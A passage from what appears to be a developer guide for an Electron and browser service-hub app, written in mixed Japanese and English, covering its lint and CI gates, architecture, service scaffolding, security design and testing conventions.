                           #   鎖に映らなかった。今は除外の側で満たしてよいのは
                           #   **名指しの台帳 `WALLS_VIA_EXCLUSION`** (双方向・実測 1 件) に
                           #   在るときだけ。**道そのものは残す** —— 35 の壁のうち 1 件
                           #   (`updateCheck.ts` · 鎖の #89 で宣言つきに移った) がそれで満たしており、
                           #   閉じると今日の実物が落ちる。実物がこの規則の下に居ることは
                           #   `src/shared/__tests__/protectedListShrink.test.ts` が npm test で見る
npm run lint:regex         # 正規表現の破滅的バックトラック (ReDoS) を実測。worker + 番犬つき
                           #   (モデル応答を解析する assistantMarkdown.ts が主眼。指数のみ)。
                           #   **多項式 (O(n²)) を外した理由は「入力が短いから」ではない** ——
                           #   2026-09-20 (パス 337) まで門の説明文は
                           #   「上限は MAX_ANALYZE_TEXT_CHARS 5000 等なので O(n²) でも 30ms」
                           #   と書いていたが、実物の最大は **MAX_TEXT_PREVIEW_CHARS 200,000**
                           #   (取り込んだファイルの本文) で、そこでは **1 呼び出し 31 秒**だった。
                           #   結論が生きているのは**到達可能性**のため —— 出荷 src の式 588 本で
                           #   250ms を超えるのは 4 本だけで、どれも長い文字列が届かない所に在る
                           #   (ホスト名 / 利用者が打つ基底 URL / base64 のパディング / 同梱の静的データ)。
                           #   **4 本の台帳と実測は `npm run audit:regex-poly`** (CI では走らせない。
                           #   判定が壁時計時間なので —— `audit:floors` と同じ定期点検の道具)、
                           #   台帳の形と「引いている上限が実物の最大か」は
                           #   `regexPolynomialLedger.test.ts` が毎回の npm test で見る
npm run lint:parameter-prose # 画面が刷る数字と、計算に使う数字の出所が同じか
                           #   (`parameters.ts` の台帳で上書きできる 115 の定数について、
                           #   renderer が既定定数を**直接**刷っていないか。上書きすると
                           #   「効いているのに画面が古い数字で説明する」形になる。
                           #   倒し込み (`??` / 既定引数 / `=== 既定`) は規則の外・
                           #   それ以外の直接使用は台帳に理由つきで登録する)
npm run lint:zero-fold     # 「割れない値を 0 に倒す」箇所の**母集団**を数え、
                           #   `docs/REMAINING_WORK.md` の生成ブロックと突き合わせる
                           #   (`? … : 0` / `?? 0` / `|| 0`。コメントと文字列は落とす)。
                           #   **これは分母であって欠陥の一覧ではない** —— 正しい 0
                           #   (0 除算の防御・明示的な費用 0・作図の座標) と本物の欠陥の
                           #   両方を含み、どちらかは読まないと決まらない。数は機械が、
                           #   判断は散文が持つ。2026-09-08 まで件数は手で書かれ誰も検算せず、
                           #   母集団が 26 ファイル (実測 106) と 4 倍ずれていた
npm run lint:shared-judgement # 「述語は共有したが、no と言われたあとの動作が両ビルドで
                           #   違う」の**母集団**を数え、`docs/REMAINING_WORK.md` の
                           #   生成ブロックと突き合わせる (shared 157 / 両ビルドが
                           #   import 80 / うち否定で答えられる 39。**この 3 つは
                           #   live metric なので散文だけが古びることはもう無い** ——
                           #   2026-09-15 まで 138 / 44 / 21 と書いたままだった。
                           #   44 / 21 はパス 247 が初めて数えた値で、
                           #   **census 自身の docblock が「その数を散文にだけ書いた」と
                           #   その誤りを名指ししている** (だからパス 248 で生成物にした)。
                           #   パス 268 が走査を直して 61 / 31 になったときも
                           #   床 (113 / 48 / 24) だけが引き直され、散文は据え置かれた)。判定の台帳は
                           #   **両方向**に鳴る —— 母集団に入ったのに台帳に無ければ落ち、
                           #   台帳に在るのに母集団から消えても落ちる。
                           #   **これも分母であって欠陥の一覧ではない** —— 対称な物・
                           #   意図した非対称・本物の欠陥 (パス 246 の vaultToken) が
                           #   混ざる。読んでいない物に「対称だろう」とは書かない
npm run verify:all         # typecheck + all of the above + eslint (37 ゲート)
                           #   **`npm test` は含まない。** CI は両方走らせるので、
                           #   push 前は `npm test && npm run verify:all` の両方を回すこと
                           #   (verify:all だけを見て「全 green」と言うと CI で落ちる)
npm run mutate             # Stryker mutation testing (target: 100%); mutate:triage / mutate:next help
npm run knowledge:auto     # knowledge autopilot: audit → regen (vault+NotebookLM) → verify → work queue
npm run ontology:md        # docs/ONTOLOGY.md を src/shared/ontology/ (語彙・facet の公理・法則と執行者) と
                           #   実物 (台帳・ゲート・両ビルドの action の面) から再生成 (生成物 — 手で編集しない。
                           #   `--check` で committed と一致するか。`ontologyDoc.test.ts` が npm test で同じ事を留める)
npm run knowledge:md       # docs/ACADEMIC_KNOWLEDGE.md の概念表を academicKnowledge.ts から再生成
                           #   (表は生成物 — 手で行を書かない。vault:check が「再生成 == committed」を検証)
                           #   (weekly CI: knowledge-auto.yml; consume queue per docs/KNOWLEDGE_AUTOPILOT.md)
```

These are plain Node scripts in `scripts/` — there is no AST parser dependency; they grep marker
comments and source. `verify:arch` will fail if you change architecture without updating
`docs/ARCHITECTURE.md`. CI (`.github/workflows/ci.yml`) runs a single consolidated job on push to
`main` and PRs to `main` (one `npm ci`, then typecheck + **all 37 `verify:all` gates**, vitest +
coverage, and `build:web` asserting `dist/standalone.html` is generated and non-trivial) — collapsed
from 3 jobs
to 1 to minimize GitHub Actions minutes on the free tier. **`lint:docs` enforces that every gate in
`verify:all` actually appears in `ci.yml`** — adding a gate without wiring it into CI leaves it
existing but guarding nothing, which is exactly what happened to `lint:citations`,
`lint:knowledge-refs` and `verify:knowledge` (the provenance gate) until 2026-07-30.
`.github/workflows/release.yml` builds Mac/Win/Linux installers on `v*` tags;
`dependency-audit.yml` runs **weekly** (Mon 07:00 JST) — `npm audit` (全体 / prod) +
`audit:floors` を突き合わせ、要対応を常設 Issue 1 つに集める。**PR の門は狭いまま**
(`--omit=dev --audit-level=high`) で、狭くした外側 (dev の勧告・床の古び) を週次が受け持つ。
予定実行なので誰の PR も赤くしない;
`mutation.yml` runs Stryker (weekly + on pushes to `main` that touch `stryker.config.json`,
`vitest.config.ts`, `src/main/clients/**` or `src/main/oauth.ts`). `smoke` (Electron の全ページ撮影) is **not** in CI at all.
`e2e` / `e2e:lite` / `e2e:ollama` / `perf` / `smoke:app` **are** wired into `.github/workflows/e2e.yml`, but it does **not run by
default** (Actions 分の節約): trigger it from the Actions tab (`workflow_dispatch`) or by putting the
**`run-e2e` label** on a PR. `e2e:ollama` は 2026-09-17 (パス 304) まで CI の外だった —— Node (undici) は
CORS を実装しないので、no-cors の到達確認が壊れても単体検査は緑のままで、**実ブラウザでしか見えない**退行を
この harness だけが捕まえた (その日の実例: 転送に追随しない規則が no-cors にも重なり、「起動しているが
OLLAMA_ORIGINS 未設定」が「未起動」と診断された)。
`smoke:app` は 2026-08-26 に足した —— **実物の `electron .` を起動する唯一の検査**で、
それまで誰も主プロセスを通しておらず、`dist-electron/main.js` は 2 週間ほど起動不能なまま
全 CI が緑だった (`scripts/smoke-app.cjs` の冒頭に経緯)。 All of them need a real
browser or Electron — run them locally before shipping renderer or startup-performance changes.

## Architecture

Three TypeScript build contexts, kept separate via `tsconfig` project references:

- **`src/main/`** — Electron main process. `main.ts` creates the `BrowserWindow` and registers IPC
  handlers (`app:*`, `secrets:*`, `fetch:snapshot`, action invoke). `secrets.ts` persists tokens in
  the Electron `userData` dir, encrypted with `safeStorage` when the OS keychain is available
  (base64 fallback so Linux dev without a keychain still works). `oauth.ts` implements a real OAuth
  2.0 Authorization-Code + PKCE flow via a loopback `127.0.0.1` HTTP server (RFC 7636 / 8252); pure
  helpers (PKCE gen, URL building, token-request body) are exported for unit tests. Live REST clients
  live under `src/main/clients/`.
- **`src/preload/`** — Context-isolated preload exposing a typed `window.serviceHub` bridge via
  `contextBridge.exposeInMainWorld`. The bridge type is re-declared globally in
  `src/shared/bridge.d.ts` so the renderer calls it without imports.
- **`src/renderer/`** — React app. `App.tsx` renders the category-grouped sidebar from `SERVICES`
  (`services.ts`) and mounts the active page inside `components/PageErrorBoundary.tsx` (a render
  error stays inside that page's frame; the sidebar keeps working). The renderer never sees raw tokens —
  **the bridge exposes 15 methods and none of them returns a secret** (`storageProtection` returns counts and
  a mechanism name only). 全 15 件:
  `serviceHub.getVersion / checkUpdate / openExternal / revealInFolder / openPath / setColorScheme / setToken / clearToken / listConfigured / storageProtection / eraseAll / fetchSnapshot / invoke / oauthSupported / authorize`.
  **2026-09-20 (パス 338) まで、この文は 6 件だけを挙げて「it only calls」と書いていた** ——
  落ちていた 9 件には **`eraseAll` (すべてのデータを削除して再起動)**・`revealInFolder` / `openPath`
  (OS のファイル面)・`authorize` (ブラウザを開いて loopback サーバを立てる) が含まれる。
  「renderer から main へ何ができるか」を読む人が**実際より小さい面**を見ることになっていた
  (過小申告は偽の主張より軽いが、攻撃面の側では読み手を油断させる)。列挙と実物は
  `src/preload/__tests__/bridgeStatic.test.ts` が**両方向**に留める。

### The single source of truth for services

`src/shared/serviceId.ts` exports the `SERVICE_IDS` array and `ServiceId` union — **this is the one
true list**, imported by `services.ts` (sidebar), `clients/index.ts` (fetchers), and the preload
bridge. Three parallel maps in `src/main/clients/index.ts` are keyed by `ServiceId`:

- `LIVE_FETCHERS` — a **total** `Record<ServiceId, fetcher>`. A runtime invariant at module load
  throws if any `ServiceId` is missing an entry, so a forgotten service crashes loudly at app start
  rather than on first click. Note: many entries are static stubs (investment, 士業, food delivery)
  that just satisfy the invariant and return `SNAPSHOT[id]` directly — only the SaaS clients do real
  network I/O.
- `LOCAL_SERVICES` — services whose fetcher reads local resources and needs no saved credentials
  (a missing token is not an error for these).
- `LIVE_ACTIONS` — `Partial<Record<ServiceId, ActionMap>>` of write-side actions, invoked from the
  renderer via `serviceHub.invoke()`.

### Adding a service

**Use the scaffolder** — don't wire services by hand:

```bash
npm run scaffold -- <id> "<Label>" <ICON> [bearer|oauth|json]
```

It creates the client + test + page and patches `serviceId.ts`, `clients/index.ts`, `services.ts`,
and `snapshot.ts` by inserting at `// SCAFFOLD:ADD_*` marker comments. `auth-kind`: `bearer` (PAT/API
token → `Authorization: Bearer`), `oauth` (OAuth access token, same wire as bearer), `json`
(`{email,token,site}` Basic auth, e.g. Atlassian). Then fill the TODOs in the generated client, run
`npm run typecheck && npm test`, and `git checkout` the patched files to undo. Full guide:
`docs/ADDING_A_SERVICE.md`.

### Page composition

Each service page calls `useServiceData(id, SNAPSHOT[id])` and renders with the shared
`components/StatusBar.tsx` (unified refresh button + optional `tokenSetup` credential slot) +
`Section` + `components/DataList.tsx` (cards with thumbnail / meta / badge / open-external). Keep
pages declarative — if a visual primitive is needed by more than one page, add it under `components/`.

### Live fetcher contract

A fetcher takes `{ token, fetch? }` and returns a value with the same shape as `SNAPSHOT[id]`.
`fetch` is injectable so fetchers are unit-testable under Node without a network. See
`src/main/clients/github.ts` and its `__tests__/github.test.ts` (mock with `vi.fn<typeof fetch>()`).

### API clients (`src/shared/api/*.ts`)

Framework-agnostic classes implementing `ServiceClient` (`id`, `isConfigured()`). Credentialed
methods must guard with `if (!this.isConfigured()) throw new NotConfiguredError(this.id);` before any
network call, so they can run from either the renderer or main depending on whether the token must
stay out of the renderer.

### Browser standalone layer (`build:web`)

The browser target adds: `web-shim.ts` (a `window.serviceHub` polyfill imported first in `main.tsx`),
`web-templates.ts`, and a client-side security/storage stack under `src/renderer/`:

- `security/vault.ts` — WebCrypto AES-GCM-256 with a PBKDF2-SHA-256 (600k iter) key derived from the
  master password; key is `extractable: false`, memory-only. `LockScreen.tsx` + `autoLock.ts` lock on
  tab-hidden / idle.
- `library/library.ts` — IndexedDB blob store. `fs/fsa.ts` — File System Access API wrapper.
- `network/proxy.ts` — routes CORS-blocked APIs (Notion / Atlassian / Cloudflare) through a
  user-supplied Cloudflare Worker (`docs/PROXY_EXAMPLE.md`). `oauth/pkce.ts` — out-of-band paste PKCE
  for `file://`.

`scripts/inline-html.cjs` inlines CSS/JS into `dist/standalone.html`. Vite (`vite.config.ts`) has
`root: 'src/renderer'`, renderer build → repo-root `dist/`, Electron bundles → `dist-electron/`
(both gitignored).

## Conventions

- `window.serviceHub` is the **only** sanctioned way to call into the main process. Do not add
  `nodeIntegration: true` or remove `contextIsolation` — extend the preload bridge instead
  (`lint:forbidden` enforces this).
- External links must go through `window.serviceHub.openExternal(url)` (→ `shell.openExternal`), never
  `window.open`, so the OS browser handles them.
- Add new service IDs to `SERVICE_IDS` in `src/shared/serviceId.ts` (not `services.ts`) — the type
  system then flags every dependent switch/lookup, and prefer `npm run scaffold` over manual edits.
- **計算に使う固定の数字 (法定値・参考値・しきい値・前提) は `src/shared/parameters.ts` の台帳に登録し、
  画面は `useParameters()` で読んで関数へ引数で渡す。** 既定値はモジュールの定数をそのまま参照する
  (数字を写さない)。登録した値は**必ず配線し、`parameterWiring.test.ts` で「上書きすると画面が動く」を
  対照つきで留める** — 「設定できるのに効かない」項目を作らない。安全上限 (timeout / 応答サイズ /
  PBKDF2 反復 / 入力長) は台帳に載せない。
- When you change architecture, update `docs/ARCHITECTURE.md` too — `verify:arch` checks its
  `file:line` references and metrics against the real tree.
- **不在を主張する検査には、標本を添える。** `not.toMatch(/…/)` や
  `!body.includes('…')` は、綴りが 1 つ違えば黙る — どの入力でも通る空の検査になる。
  規則が**実際にその文面へ当たる**ことを、同じテストの中で標本に対して確かめること
  (2026-08-25 に 2 件やらかした。どちらも「記憶の言い換え」に対して正規表現を書いていた)。
  肯定形で書けるならそのほうが安全 — **有ることの検査は、無ければ必ず鳴る**。
  **標本は、走査に掛ける物と同じ加工を通す。** 生の文字列に当てた標本は
  「針は生きている」しか示さない — 2026-09-25 (パス 458) に、`stripNonCode` を
  通した本文へ日本語の文を `not.toContain` で当て、**どの入力でも通る空の検査**を
  書いた (この道具は文字列リテラルの中身を落とす)。標本も添えていたが、その標本を
  生の文字列に当てていたので空であることが見えなかった。
  非対称は `shared/__tests__/stripNonCodeParity.test.ts` が振る舞いで留めている
  (**JSX の素のテキストは残り、文字列リテラルの中身は落ちる** — 主張の字面は
  どちらも同じなので、書いた人には見分けが付かない)。
  **2026-09-15 (パス 293) からこの規約には機械が付いている** ——
  `shared/__tests__/absenceSampleCensus.test.ts` が母集団を数え、
  **正規表現の針**で綴りを肯定形で確かめていない物を台帳制にする (両方向)。
  実測: 不在の主張 **1,125 件 / 306 ファイル**。うち針が**日本語の散文**
  (= 他のモジュールが書いた文) である物 **496 件**、その綴りがどこかで
  肯定形でも主張されている物 **240 件**、**されていない物 256 件**
  (うち正規表現 **14 件** = 台帳の全量)。
  **文字列の針 (242 件) は台帳に載せない** —— `toContain` は完全一致なので
  綴りが外れれば**その検査が必ず落ちる**。「当たったつもり」で黙れるのは
  正規表現の側だけで、**この非対称が台帳の範囲を決めている**。
  規約が 2026-08-25 から在ったのに機械が無かったのは、
  このリポジトリが繰り返し直してきた「散文で述べた規則は落ちない」形である。
- **規則は散文ではなく `src/shared/ontology/` に置く** (2026-09-19 · パス 321)。新しい法則を学んだら
  `laws.ts` に「何を守るか・出典・執行者」を足す (執行者が prose だけなら文書の「機械の無い法則」に集まる)。
  サービスの facet に新しい関係が見えたら `serviceFacets.ts` の公理に (成り立たないサービスは理由つきの
  `exceptions` へ —— 双方向)。外部サービスへの書き込みを足すときは `shared/api/<service>.ts` に
  `checkX` → `xInit` → `parseCreatedX` を置き、main と `saasWriteWeb.ts` はそれを通す
  (`writeFieldLimits.test.ts` の LEDGERS に `via` 行)。**両ビルドに同じ判定を 2 度書かない。**
- **対照を回すまで、検査は信用しない。** 守っている物を実際に壊し、狙った項目が
  落ちることを見る。**鳴らない対照は「合格」ではなく「その検査についての報せ」である。**

## Branching

Active development for Claude Code sessions happens on the branch designated in the task prompt
(e.g. `claude/claude-md-docs-qqUAT`). The default branch is `main`.
